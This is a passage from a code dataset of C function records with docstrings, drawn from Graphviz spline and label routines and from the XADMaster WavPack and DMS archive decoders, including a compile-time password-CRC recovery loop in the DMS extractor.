continue;\n\t    }\n\t    hend.nb = maximal_bbox(sp, hn, e, ND_out(hn).list[0]);\n\t    endpath(P, e, REGULAREDGE, &hend, spline_merge(aghead(e)));\n\t    b = makeregularend(hend.boxes[hend.boxn - 1], TOP,\n\t    \t       ND_coord(hn).y + GD_rank(agraphof(hn))[ND_rank(hn)].ht2);\n\t    if (b.LL.x < b.UR.x && b.LL.y < b.UR.y)\n\t        hend.boxes[hend.boxn++] = b;\n\t    P->end.theta = M_PI / 2, P->end.constrained = TRUE;\n\t    completeregularpath(P, segfirst, e, &tend, &hend, boxes, boxn, 1);\n\t    if (splines) ps = routesplines(P, &pn);\n\t    else {\n\t\tps = routepolylines (P, &pn);\n\t\tif ((et == ET_LINE) && (pn > 4)) {\n\t\t    ps[1] = ps[0];\n\t\t    ps[3] = ps[2] = ps[pn-1];\n\t\t    pn = 4;\n\t\t}\n\t    }\n\t    if (pn == 0)\n\t        return;\n\t\n\t    if (pointn + pn > numpts) {\n                /* This should be enough to include 3 extra points added by\n                 * straight_path below.\n                 */\n\t\tnumpts = 2*(pointn+pn); \n\t\tpointfs = RALLOC(numpts, pointfs, pointf);\n\t    }\n\t    for (i = 0; i < pn; i++) {\n\t\tpointfs[pointn++] = ps[i];\n\t    }\n\t    e = straight_path(ND_out(hn).list[0], sl, pointfs, &pointn);\n\t    recover_slack(segfirst, P);\n\t    segfirst = e;\n\t    tn = agtail(e);\n\t    hn = aghead(e);\n\t    boxn = 0;\n\t    tend.nb = maximal_bbox(sp, tn, ND_in(tn).list[0], e);\n\t    beginpath(P, e, REGULAREDGE, &tend, spline_merge(tn));\n\t    b = makeregularend(tend.boxes[tend.boxn - 1], BOTTOM,\n\t    \t       ND_coord(tn).y - GD_rank(agraphof(tn))[ND_rank(tn)].ht1);\n\t    if (b.LL.x < b.UR.x && b.LL.y < b.UR.y)\n\t        tend.boxes[tend.boxn++] = b;\n\t    P->start.theta = -M_PI / 2, P->start.constrained = TRUE;\n\t    smode = FALSE;\n\t}\n\tboxes[boxn++] = rank_box(sp, g, ND_rank(tn));\n\tb = hend.nb = maximal_bbox(sp, hn, e, NULL);\n\tendpath(P, hackflag ? &fwdedgeb : e, REGULAREDGE, &hend,\n\t        spline_merge(aghead(e)));\n\tb.UR.y = hend.boxes[hend.boxn - 1].UR.y;\n\tb.LL.y = hend.boxes[hend.boxn - 1].LL.y;\n\tb = makeregularend(b, TOP,\n\t    \t   ND_coord(hn).y + GD_rank(agraphof(hn))[ND_rank(hn)].ht2);\n\tif (b.LL.x < b.UR.x && b.LL.y < b.UR.y)\n\t    hend.boxes[hend.boxn++] = b;\n\tcompleteregularpath(P, segfirst, e, &tend, &hend, boxes, boxn,\n\t    \t\tlongedge);\n\tif (splines) ps = routesplines(P, &pn);\n\telse ps = routepolylines (P, &pn);\n\tif ((et == ET_LINE) && (pn > 4)) {\n\t    /* Here we have used the polyline case to handle\n\t     * an edge between two nodes on adjacent ranks. If the\n\t     * results really is a polyline, straighten it.\n\t     */\n\t    ps[1] = ps[0];\n\t    ps[3] = ps[2] = ps[pn-1];\n\t    pn = 4;\n        }\n\tif (pn == 0)\n\t    return;\n\tif (pointn + pn > numpts) {\n\t    numpts = 2*(pointn+pn); \n\t    pointfs = RALLOC(numpts, pointfs, pointf);\n\t}\n\tfor (i = 0; i < pn; i++) {\n\t    pointfs[pointn++] = ps[i];\n\t}\n\trecover_slack(segfirst, P);\n\thn = hackflag ? aghead(&fwdedgeb) : aghead(e);\n    }\n\n    /* make copies of the spline points, one per multi-edge */\n\n    if (cnt == 1) {\n\tclip_and_install(fe, hn, pointfs, pointn, &sinfo);\n\treturn;\n    }\n    dx = sp->Multisep * (cnt - 1) / 2;\n    for (i = 1; i < pointn - 1; i++)\n\tpointfs[i].x -= dx;\n\n    if (numpts > numpts2) {\n\tnumpts2 = numpts; \n\tpointfs2 = RALLOC(numpts2, pointfs2, pointf);\n    }\n    for (i = 0; i < pointn; i++)\n\tpointfs2[i] = pointfs[i];\n    clip_and_install(fe, hn, pointfs2, pointn, &sinfo);\n    for (j = 1; j < cnt; j++) {\n\te = edges[ind + j];\n\tif (ED_tree_index(e) & BWDEDGE) {\n\t    MAKEFWDEDGE(&fwdedge, e);\n\t    e = &fwdedge;\n\t}\n\tfor (i = 1; i < pointn - 1; i++)\n\t    pointfs[i].x += sp->Multisep;\n\tfor (i = 0; i < pointn; i++)\n\t    pointfs2[i] = pointfs[i];\n\tclip_and_install(e, aghead(e), pointfs2, pointn, &sinfo);\n    }\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* agstrdup_html:\n * For various purposes, including deparsing, we have to recognize\n * strings coming from <...> rather than \"...\". To do this, we set\n * the top bit of the refcnt field. Since the use of html strings\n * is localized, we allow the application to make the distinction.\n */\n", "func_signal": "char *agstrdup_html(char *s)", "code": "{\n    refstr_t *key, *r;\n\n    if (StringDict == NULL)\n\tinitialize_strings();\n    if (s == NULL)\n\treturn s;\n\n    key = (refstr_t *) (s - offsetof(refstr_t, s[0]));\n    r = (refstr_t *) dtsearch(StringDict, key);\n    if (r)\n\tr->refcnt++;\n    else {\n\tr = (refstr_t *) malloc(sizeof(refstr_t) + strlen(s));\n\tr->refcnt = 1 | HTML_BIT;\n\tstrcpy(r->s, s);\n\tdtinsert(StringDict, r);\n    }\n    return r->s;\n}", "path": "graph\\refstr.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* side > 0 means right. side < 0 means left */\n", "func_signal": "static edge_t *top_bound(edge_t * e, int side)", "code": "{\n    edge_t *f, *ans = NULL;\n    int i;\n\n    for (i = 0; (f = ND_out(agtail(e)).list[i]); i++) {\n#if 0\t\t\t\t/* were we out of our minds? */\n\tif (ED_tail_port(e).p.x != ED_tail_port(f).p.x)\n\t    continue;\n#endif\n\tif (side * (ND_order(aghead(f)) - ND_order(aghead(e))) <= 0)\n\t    continue;\n\tif ((ED_spl(f) == NULL)\n\t    && ((ED_to_orig(f) == NULL) || (ED_spl(ED_to_orig(f)) == NULL)))\n\t    continue;\n\tif ((ans == NULL)\n\t    || (side * (ND_order(aghead(ans)) - ND_order(aghead(f))) > 0))\n\t    ans = f;\n    }\n    return ans;\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* makeSimpleFlatLabels:\n * This handles the second simplest case for flat edges between\n * two adjacent nodes. We still invoke a dot on a rotated problem\n * to handle edges with ports. This usually works, but fails for\n * records because of their weird nature.\n */\n", "func_signal": "static void\nmakeSimpleFlatLabels (node_t* tn, node_t* hn, edge_t** edges, int ind, int cnt, int et, int n_lbls)", "code": "{\n    pointf *ps;\n    Ppoly_t poly;\n    int pn;\n    edge_t* e = edges[ind];\n    pointf points[10], tp, hp;\n    int i, pointn;\n    double leftend, rightend, ctrx, ctry, miny, maxy;\n    double uminx, umaxx;\n    double lminx, lmaxx;\n\n    edge_t** earray = N_NEW(cnt, edge_t*);\n\n    for (i = 0; i < cnt; i++) {\n\tearray[i] = edges[ind + i];\n    }\n\n    qsort (earray, cnt, sizeof(edge_t*), (qsort_cmpf) edgelblcmpfn);\n\n    tp = add_pointf(ND_coord(tn), ED_tail_port(e).p);\n    hp = add_pointf(ND_coord(hn), ED_head_port(e).p);\n\n    leftend = tp.x+ND_rw(tn);\n    rightend = hp.x-ND_lw(hn);\n    ctrx = (leftend + rightend)/2.0;\n    \n    /* do first edge */\n    pointn = 0;\n    points[pointn++] = tp;\n    points[pointn++] = tp;\n    points[pointn++] = hp;\n    points[pointn++] = hp;\n#ifndef WITH_CGRAPH\n    clip_and_install(e, e->head, points, pointn, &sinfo);\n#else /* WITH_CGRAPH */\n    clip_and_install(e, aghead(e), points, pointn, &sinfo);\n#endif /* WITH_CGRAPH */\n    ED_label(e)->pos.x = ctrx;\n    ED_label(e)->pos.y = tp.y + (ED_label(e)->dimen.y+LBL_SPACE)/2.0;\n    ED_label(e)->set = TRUE;\n\n    miny = tp.y + LBL_SPACE/2.0;\n    maxy = miny + ED_label(e)->dimen.y;\n    uminx = ctrx - (ED_label(e)->dimen.x)/2.0;\n    umaxx = ctrx + (ED_label(e)->dimen.x)/2.0;\n\n    for (i = 1; i < n_lbls; i++) {\n\te = edges[ind + i];\n\tif (i%2) {  /* down */\n\t    if (i == 1) {\n\t\tlminx = ctrx - (ED_label(e)->dimen.x)/2.0;\n\t\tlmaxx = ctrx + (ED_label(e)->dimen.x)/2.0;\n\t    }\n\t    miny -= LBL_SPACE + ED_label(e)->dimen.y;\n\t    points[0] = tp;\n\t    points[1].x = tp.x;\n\t    points[1].y = miny - LBL_SPACE;\n\t    points[2].x = hp.x;\n\t    points[2].y = points[1].y;\n\t    points[3] = hp;\n\t    points[4].x = lmaxx;\n\t    points[4].y = hp.y;\n\t    points[5].x = lmaxx;\n\t    points[5].y = miny;\n\t    points[6].x = lminx;\n\t    points[6].y = miny;\n\t    points[7].x = lminx;\n\t    points[7].y = tp.y;\n\t    ctry = miny + (ED_label(e)->dimen.y)/2.0;\n\t}\n\telse {   /* up */\n\t    points[0] = tp;\n\t    points[1].x = uminx;\n\t    points[1].y = tp.y;\n\t    points[2].x = uminx;\n\t    points[2].y = maxy;\n\t    points[3].x = umaxx;\n\t    points[3].y = maxy;\n\t    points[4].x = umaxx;\n\t    points[4].y = hp.y;\n\t    points[5].x = hp.x;\n\t    points[5].y = hp.y;\n\t    points[6].x = hp.x;\n\t    points[6].y = maxy + LBL_SPACE;\n\t    points[7].x = tp.x;\n\t    points[7].y = maxy + LBL_SPACE;\n\t    ctry =  maxy + (ED_label(e)->dimen.y)/2.0 + LBL_SPACE;\n\t    maxy += ED_label(e)->dimen.y + LBL_SPACE;\n\t}\n\tpoly.pn = 8;\n\tpoly.ps = (Ppoint_t*)points;\n\tps = simpleSplineRoute (tp, hp, poly, &pn, et == ET_PLINE);\n\tif (pn == 0) return;\n\tED_label(e)->pos.x = ctrx;\n\tED_label(e)->pos.y = ctry;\n\tED_label(e)->set = TRUE;\n#ifndef WITH_CGRAPH\n\tclip_and_install(e, e->head, ps, pn, &sinfo);\n#else /* WITH_CGRAPH */\n\tclip_and_install(e, aghead(e), ps, pn, &sinfo);\n#endif /* WITH_CGRAPH */\n    }\n\n    /* edges with no labels */\n    for (; i < cnt; i++) {\n\te = edges[ind + i];\n\tif (i%2) {  /* down */\n\t    if (i == 1) {\n\t\tlminx = (2*leftend + rightend)/3.0;\n\t\tlmaxx = (leftend + 2*rightend)/3.0;\n\t    }\n\t    miny -= LBL_SPACE;\n\t    points[0] = tp;\n\t    points[1].x = tp.x;\n\t    points[1].y = miny - LBL_SPACE;\n\t    points[2].x = hp.x;\n\t    points[2].y = points[1].y;\n\t    points[3] = hp;\n\t    points[4].x = lmaxx;\n\t    points[4].y = hp.y;\n\t    points[5].x = lmaxx;\n\t    points[5].y = miny;\n\t    points[6].x = lminx;\n\t    points[6].y = miny;\n\t    points[7].x = lminx;\n\t    points[7].y = tp.y;\n\t}\n\telse {   /* up */\n\t    points[0] = tp;\n\t    points[1].x = uminx;\n\t    points[1].y = tp.y;\n\t    points[2].x = uminx;\n\t    points[2].y = maxy;\n\t    points[3].x = umaxx;\n\t    points[3].y = maxy;\n\t    points[4].x = umaxx;\n\t    points[4].y = hp.y;\n\t    points[5].x = hp.x;\n\t    points[5].y = hp.y;\n\t    points[6].x = hp.x;\n\t    points[6].y = maxy + LBL_SPACE;\n\t    points[7].x = tp.x;\n\t    points[7].y = maxy + LBL_SPACE;\n\t    maxy += + LBL_SPACE;\n\t}\n\tpoly.pn = 8;\n\tpoly.ps = (Ppoint_t*)points;\n\tps = simpleSplineRoute (tp, hp, poly, &pn, et == ET_PLINE);\n\tif (pn == 0) return;\n#ifndef WITH_CGRAPH\n\tclip_and_install(e, e->head, ps, pn, &sinfo);\n#else /* WITH_CGRAPH */\n\tclip_and_install(e, aghead(e), ps, pn, &sinfo);\n#endif /* WITH_CGRAPH */\n    }\n   \n    free (earray);\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* compiles <str> into a label <lp> */\n", "func_signal": "void make_simple_label(graph_t * g, textlabel_t * lp)", "code": "{\n    char c, *p, *line, *lineptr, *str = lp->text;\n    unsigned char byte = 0x00;\n\n    lp->dimen.x = lp->dimen.y = 0.0;\n    if (*str == '\\0')\n\treturn;\n\n    line = lineptr = NULL;\n    p = str;\n    line = lineptr = N_GNEW(strlen(p) + 1, char);\n    *line = 0;\n    while ((c = *p++)) {\n\tbyte = (unsigned int) c;\n\t/* wingraphviz allows a combination of ascii and big-5. The latter\n         * is a two-byte encoding, with the first byte in 0xA1-0xFE, and\n         * the second in 0x40-0x7e or 0xa1-0xfe. We assume that the input\n         * is well-formed, but check that we don't go past the ending '\\0'.\n         */\n\tif ((lp->charset == CHAR_BIG5) && 0xA1 <= byte && byte <= 0xFE) {\n\t    *lineptr++ = c;\n\t    c = *p++;\n\t    *lineptr++ = c;\n\t    if (!c) /* NB. Protect against unexpected string end here */\n\t\tbreak;\n\t} else {\n\t    if (c == '\\\\') {\n\t\tswitch (*p) {\n\t\tcase 'n':\n\t\tcase 'l':\n\t\tcase 'r':\n\t\t    *lineptr++ = '\\0';\n\t\t    storeline(g, lp, line, *p);\n\t\t    line = lineptr;\n\t\t    break;\n\t\tdefault:\n\t\t    *lineptr++ = *p;\n\t\t}\n\t\tif (*p)\n\t\t    p++;\n\t\t/* tcldot can enter real linend characters */\n\t    } else if (c == '\\n') {\n\t\t*lineptr++ = '\\0';\n\t\tstoreline(g, lp, line, 'n');\n\t\tline = lineptr;\n\t    } else {\n\t\t*lineptr++ = c;\n\t    }\n\t}\n    }\n\n    if (line != lineptr) {\n\t*lineptr++ = '\\0';\n\tstoreline(g, lp, line, 'n');\n    }\n\n    lp->space = lp->dimen;\n}", "path": "common\\labels.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* makeSimpleFlat:\n */\n", "func_signal": "static void\nmakeSimpleFlat (node_t* tn, node_t* hn, edge_t** edges, int ind, int cnt, int et)", "code": "{\n    edge_t* e = edges[ind];\n    pointf points[10], tp, hp;\n    int i, pointn;\n    double stepy, dy;\n\n    tp = add_pointf(ND_coord(tn), ED_tail_port(e).p);\n    hp = add_pointf(ND_coord(hn), ED_head_port(e).p);\n\n    stepy = (cnt > 1) ? ND_ht(tn) / (double)(cnt - 1) : 0.;\n    dy = tp.y - ((cnt > 1) ? ND_ht(tn) / 2. : 0.);\n\n    for (i = 0; i < cnt; i++) {\n\te = edges[ind + i];\n\tpointn = 0;\n\tif ((et == ET_SPLINE) || (et == ET_LINE)) {\n\t    points[pointn++] = tp;\n\t    points[pointn++] = pointfof((2 * tp.x + hp.x) / 3, dy);\n\t    points[pointn++] = pointfof((2 * hp.x + tp.x) / 3, dy);\n\t    points[pointn++] = hp;\n\t}\n\telse {   /* ET_PLINE */\n\t    points[pointn++] = tp;\n\t    points[pointn++] = tp;\n\t    points[pointn++] = pointfof((2 * tp.x + hp.x) / 3, dy);\n\t    points[pointn++] = pointfof((2 * tp.x + hp.x) / 3, dy);\n\t    points[pointn++] = pointfof((2 * tp.x + hp.x) / 3, dy);\n\t    points[pointn++] = pointfof((2 * hp.x + tp.x) / 3, dy);\n\t    points[pointn++] = pointfof((2 * hp.x + tp.x) / 3, dy);\n\t    points[pointn++] = pointfof((2 * hp.x + tp.x) / 3, dy);\n\t    points[pointn++] = hp;\n\t    points[pointn++] = hp;\n\t}\n\tdy += stepy;\n#ifndef WITH_CGRAPH\n\tclip_and_install(e, e->head, points, pointn, &sinfo);\n#else /* WITH_CGRAPH */\n\tclip_and_install(e, aghead(e), points, pointn, &sinfo);\n#endif /* WITH_CGRAPH */\n    }\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* cleanupCloneGraph:\n */\n", "func_signal": "static void\ncleanupCloneGraph (graph_t* g)", "code": "{\n    /* restore main graph syms */\n    E_constr = attr_state.E_constr;\n    E_samehead = attr_state.E_samehead;\n    E_sametail = attr_state.E_sametail;\n    E_weight = attr_state.E_weight;\n    E_minlen = attr_state.E_minlen;\n    N_group = attr_state.N_group;\n    State = attr_state.State;\n\n    dot_cleanup(g);\n    agclose(g);\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "/* swap_bezier:\n */\n", "func_signal": "static void swap_bezier(bezier * old, bezier * new)", "code": "{\n    pointf *list;\n    pointf *lp;\n    pointf *olp;\n    int i, sz;\n\n    sz = old->size;\n    list = N_GNEW(sz, pointf);\n    lp = list;\n    olp = old->list + (sz - 1);\n    for (i = 0; i < sz; i++) {\t/* reverse list of points */\n\t*lp++ = *olp--;\n    }\n\n    new->list = list;\n    new->size = sz;\n    new->sflag = old->eflag;\n    new->eflag = old->sflag;\n    new->sp = old->ep;\n    new->ep = old->sp;\n}", "path": "dotgen\\dotsplines.c", "repo_name": "gyuque/livizjs", "stars": 204, "license": "None", "language": "c", "size": 1904}
{"docstring": "// This function is used to scan some number of samples to set the variables\n// \"slow_level\" and the \"median\" array. In pure symetrical encoding mode this\n// would not be needed because these values would simply be continued from the\n// previous block. However, in the -X modes and the 32-bit modes we cannot do\n// this because parameters may change between blocks and the variables might\n// not apply. This function can work in mono or stereo and can scan a block\n// in either direction.\n", "func_signal": "void scan_word (WavpackStream *wps, int32_t *samples, uint32_t num_samples, int dir)", "code": "{\n    uint32_t flags = wps->wphdr.flags, value, low;\n    struct entropy_data *c = wps->w.c;\n    int chan;\n\n    init_words (wps);\n\n    if (flags & MONO_DATA) {\n        if (dir < 0) {\n            samples += (num_samples - 1);\n            dir = -1;\n        }\n        else\n            dir = 1;\n    }\n    else {\n        if (dir < 0) {\n            samples += (num_samples - 1) * 2;\n            dir = -2;\n        }\n        else\n            dir = 2;\n    }\n\n    while (num_samples--) {\n\n        value = labs (samples [chan = 0]);\n\n        if (flags & HYBRID_BITRATE) {\n            wps->w.c [0].slow_level -= (wps->w.c [0].slow_level + SLO) >> SLS;\n            wps->w.c [0].slow_level += mylog2 (value);\n        }\n\n        if (value < GET_MED (0)) {\n            DEC_MED0 ();\n        }\n        else {\n            low = GET_MED (0);\n            INC_MED0 ();\n\n            if (value - low < GET_MED (1)) {\n                DEC_MED1 ();\n            }\n            else {\n                low += GET_MED (1);\n                INC_MED1 ();\n\n                if (value - low < GET_MED (2)) {\n                    DEC_MED2 ();\n                }\n                else {\n                    INC_MED2 ();\n                }\n            }\n        }\n\n        if (!(flags & MONO_DATA)) {\n            value = labs (samples [chan = 1]);\n            c++;\n\n            if (wps->wphdr.flags & HYBRID_BITRATE) {\n                wps->w.c [1].slow_level -= (wps->w.c [1].slow_level + SLO) >> SLS;\n                wps->w.c [1].slow_level += mylog2 (value);\n            }\n\n            if (value < GET_MED (0)) {\n                DEC_MED0 ();\n            }\n            else {\n                low = GET_MED (0);\n                INC_MED0 ();\n\n                if (value - low < GET_MED (1)) {\n                    DEC_MED1 ();\n                }\n                else {\n                    low += GET_MED (1);\n                    INC_MED1 ();\n\n                    if (value - low < GET_MED (2)) {\n                        DEC_MED2 ();\n                    }\n                    else {\n                        INC_MED2 ();\n                    }\n                }\n            }\n\n            c--;\n        }\n\n        samples += dir;\n    }\n}", "path": "XADMaster\\wavpack\\words.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "/****************************************************************************/\n", "func_signal": "XADCLIENT(SDSSFX)", "code": "{\n  XADNEXTCLIENT,\n  XADCLIENT_VERSION,\n  XADMASTERVERSION,\n  SDSSFX_VERSION,\n  SDSSFX_REVISION,\n  100,\n  XADCF_FILEARCHIVER|XADCF_FREEFILEINFO,\n  XADCID_SDSSFX,\n  \"SDS Software SFX\",\n  XADRECOGDATAP(SDSSFX),\n  XADGETINFOP(SDSSFX),\n  XADUNARCHIVEP(SDSSFX),\n  NULL\n}", "path": "XADMaster\\libxad\\clients\\DMS.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "// This function writes the specified word to the open bitstream \"wvbits\" and,\n// if the bitstream \"wvcbits\" is open, writes any correction data there. This\n// function will work for either lossless or hybrid but because a version\n// optimized for lossless exits below, it would normally be used for the hybrid\n// mode only. The return value is the actual value stored to the stream (even\n// if a correction file is being created) and is used as feedback to the\n// predictor.\n", "func_signal": "int32_t FASTCALL send_word (WavpackStream *wps, int32_t value, int chan)", "code": "{\n    struct entropy_data *c = wps->w.c + chan;\n    uint32_t ones_count, low, mid, high;\n    int sign = (value < 0) ? 1 : 0;\n\n    if (wps->w.c [0].median [0] < 2 && !wps->w.holding_zero && wps->w.c [1].median [0] < 2) {\n        if (wps->w.zeros_acc) {\n            if (value)\n                flush_word (wps);\n            else {\n                c->slow_level -= (c->slow_level + SLO) >> SLS;\n                wps->w.zeros_acc++;\n                return 0;\n            }\n        }\n        else if (value) {\n            putbit_0 (&wps->wvbits);\n        }\n        else {\n            c->slow_level -= (c->slow_level + SLO) >> SLS;\n            CLEAR (wps->w.c [0].median);\n            CLEAR (wps->w.c [1].median);\n            wps->w.zeros_acc = 1;\n            return 0;\n        }\n    }\n\n    if (sign)\n        value = ~value;\n\n    if ((wps->wphdr.flags & HYBRID_FLAG) && !chan)\n        update_error_limit (wps);\n\n    if (value < (int32_t) GET_MED (0)) {\n        ones_count = low = 0;\n        high = GET_MED (0) - 1;\n        DEC_MED0 ();\n    }\n    else {\n        low = GET_MED (0);\n        INC_MED0 ();\n\n        if (value - low < GET_MED (1)) {\n            ones_count = 1;\n            high = low + GET_MED (1) - 1;\n            DEC_MED1 ();\n        }\n        else {\n            low += GET_MED (1);\n            INC_MED1 ();\n\n            if (value - low < GET_MED (2)) {\n                ones_count = 2;\n                high = low + GET_MED (2) - 1;\n                DEC_MED2 ();\n            }\n            else {\n                ones_count = 2 + (value - low) / GET_MED (2);\n                low += (ones_count - 2) * GET_MED (2);\n                high = low + GET_MED (2) - 1;\n                INC_MED2 ();\n            }\n        }\n    }\n\n    mid = (high + low + 1) >> 1;\n\n    if (wps->w.holding_zero) {\n        if (ones_count)\n            wps->w.holding_one++;\n\n        flush_word (wps);\n\n        if (ones_count) {\n            wps->w.holding_zero = 1;\n            ones_count--;\n        }\n        else\n            wps->w.holding_zero = 0;\n    }\n    else\n        wps->w.holding_zero = 1;\n\n    wps->w.holding_one = ones_count * 2;\n\n    if (!c->error_limit) {\n        if (high != low) {\n            uint32_t maxcode = high - low, code = value - low;\n            int bitcount = count_bits (maxcode);\n            uint32_t extras = bitset [bitcount] - maxcode - 1;\n\n            if (code < extras) {\n                wps->w.pend_data |= code << wps->w.pend_count;\n                wps->w.pend_count += bitcount - 1;\n            }\n            else {\n                wps->w.pend_data |= ((code + extras) >> 1) << wps->w.pend_count;\n                wps->w.pend_count += bitcount - 1;\n                wps->w.pend_data |= ((code + extras) & 1) << wps->w.pend_count++;\n            }\n        }\n\n        mid = value;\n    }\n    else\n        while (high - low > c->error_limit)\n            if (value < (int32_t) mid) {\n                mid = ((high = mid - 1) + low + 1) >> 1;\n                wps->w.pend_count++;\n            }\n            else {\n                mid = (high + (low = mid) + 1) >> 1;\n                wps->w.pend_data |= bitset [wps->w.pend_count++];\n            }\n\n    wps->w.pend_data |= ((int32_t) sign << wps->w.pend_count++);\n\n    if (!wps->w.holding_zero)\n        flush_word (wps);\n\n    if (bs_is_open (&wps->wvcbits) && c->error_limit) {\n        uint32_t code = value - low, maxcode = high - low;\n        int bitcount = count_bits (maxcode);\n        uint32_t extras = bitset [bitcount] - maxcode - 1;\n\n        if (bitcount) {\n            if (code < extras) {\n                putbits (code, bitcount - 1, &wps->wvcbits);\n            }\n            else {\n                putbits ((code + extras) >> 1, bitcount - 1, &wps->wvcbits);\n                putbit ((code + extras) & 1, &wps->wvcbits);\n            }\n        }\n    }\n\n    if (wps->wphdr.flags & HYBRID_BITRATE) {\n        c->slow_level -= (c->slow_level + SLO) >> SLS;\n        c->slow_level += mylog2 (mid);\n    }\n\n    return sign ? ~mid : mid;\n}", "path": "XADMaster\\wavpack\\words.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "/****************************************************************************/\n", "func_signal": "XADUNARCHIVE(DMS)", "code": "{\n  struct DMSTrack t;\n  xadINT32 i;\n  xadINT32 err = 0;\n  xadSTRPTR pwd = ai->xai_Password;\n  struct DMSData *d;\n\n#ifdef CRACK_PWD\n  xadINT32 j=1, k;\n\n  if((ai->xai_CurFile && !(ai->xai_CurFile->xfi_Flags & XADFIF_CRYPTED)) ||\n  !(ai->xai_CurDisk->xdi_Flags & XADDIF_CRYPTED))\n    pwd = 0;\n\n  if(pwd && pwd[0] == '0' && pwd[1] == 'x')\n  {\n    xadUINT8 a;\n    for(j = i = 0; i < 4; ++i)\n    {\n      a = pwd[2+i];\n      if(a >= 'A' && a <= 'F') a = a-('A'-10);\n      else if(a >= 'a' && a <= 'f') a = a-('a'-10);\n      else if(a >= '0' && a <= '9') a = a-'0';\n      j = (j<<4)+a;\n    }\n    pwd = 0;\n  }\n\n  k = ai->xai_InPos;\n  do\n  {\n    err = 0;\n    if(k != ai->xai_InPos)\n      xadHookAccess(XADM XADAC_INPUTSEEK, k-ai->xai_InPos, 0, ai);\n    if(ai->xai_OutPos)\n      xadHookAccess(XADM XADAC_OUTPUTSEEK, -ai->xai_OutPos, 0, ai);\n#else\n\n  if((ai->xai_CurFile && !(ai->xai_CurFile->xfi_Flags & XADFIF_CRYPTED)) ||\n  !(ai->xai_CurDisk->xdi_Flags & XADDIF_CRYPTED))\n    pwd = 0;\n  else if(!pwd)\n    return XADERR_PASSWORD;\n#endif\n\n  if(!(d = GetDMSData(xadMasterBase, pwd)))\n    return XADERR_NOMEMORY;\n\n#ifdef CRACK_PWD\n  if(!pwd)\n  {\n    d->RTV_Pass = d->PassCRC = j;\n    if(!(j & 0xFF))\n    {\n      DebugClient(ai, \"CRACKPWD %04lx\", j);\n    }\n  }\n  else\n    j = d->PassCRC;\n#endif\n\n  if(ai->xai_CurFile)\n  {\n    struct xadFileInfo *fi;\n\n    fi = ai->xai_CurFile;\n\n    if(fi->xfi_Flags & XADFIF_CRYPTED)\n      d->UsePwd = DMSPWD_USE;\n\n    for(i = DMSTRTYPE_FILESTART; !err && ai->xai_OutSize < fi->xfi_Size; ++i)\n    {\n      if(!(err = xadHookAccess(XADM XADAC_READ, sizeof(struct DMSTrack), &t, ai)) &&\n      !(err = testDMSTrack(&t, xadMasterBase)))\n      {\n        xadSTRPTR res;\n\n        if(i != EndGetM16(t.TrackNumber))\n          err = XADERR_ILLEGALDATA;\n        else if(!(err = DecrunchDMS(&t, ai, xadMasterBase, &res, d)))\n        {\n          err = xadHookAccess(XADM XADAC_WRITE, EndGetM16(t.UnpackedSize), res, ai);\n          xadFreeObjectA(XADM res, 0);\n        }\n        else if((err == XADERR_PASSWORD) && i != DMSTRTYPE_FILESTART)\n          err = XADERR_CHECKSUM; /* prevent wrong password errors */\n      }\n    }\n  }\n  else\n  {\n    struct xadDiskInfo *di;\n\n    di = ai->xai_CurDisk;\n    if(di->xdi_Flags & XADDIF_CRYPTED)\n      d->UsePwd = DMSPWD_USE;\n\n    for(i = ai->xai_LowCyl; !err && i <= ai->xai_HighCyl;)\n    {\n      if(!(err = xadHookAccess(XADM XADAC_READ, sizeof(struct DMSTrack), &t, ai)) &&\n      !(err = testDMSTrack(&t, xadMasterBase)))\n      {\n        xadSTRPTR res;\n\n        if(!(err = DecrunchDMS(&t, ai, xadMasterBase, &res, d)))\n        { /* xdi_PrivateInfo contains start pos of useful data */\n          if(ai->xai_InPos > (xadUINT32)(uintptr_t) di->xdi_PrivateInfo) /* skip unusable parts */\n          {\n            if(i == EndGetM16(t.TrackNumber))\n            {\n              err = xadHookAccess(XADM XADAC_WRITE, EndGetM16(t.UnpackedSize), res, ai); ++i;\n            }\n            else if(EndGetM16(t.TrackNumber) > i)\n              err = XADERR_ILLEGALDATA;\n          }\n          xadFreeObjectA(XADM res,0);\n        }\n        else if((err == XADERR_PASSWORD) && i != ai->xai_LowCyl)\n          err = XADERR_CHECKSUM; /* prevent wrong password errors */\n      }\n    }\n  }\n\n  xadFreeObjectA(XADM d, 0);\n\n#ifdef CRACK_PWD\n  } while(++j < 65536 && err && !pwd);\n\n  if(!err)\n    DebugClient(ai,\"Final Pass CRC is %04lx\\n\", --j);\n#endif\n\n  return err;\n}", "path": "XADMaster\\libxad\\clients\\DMS.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
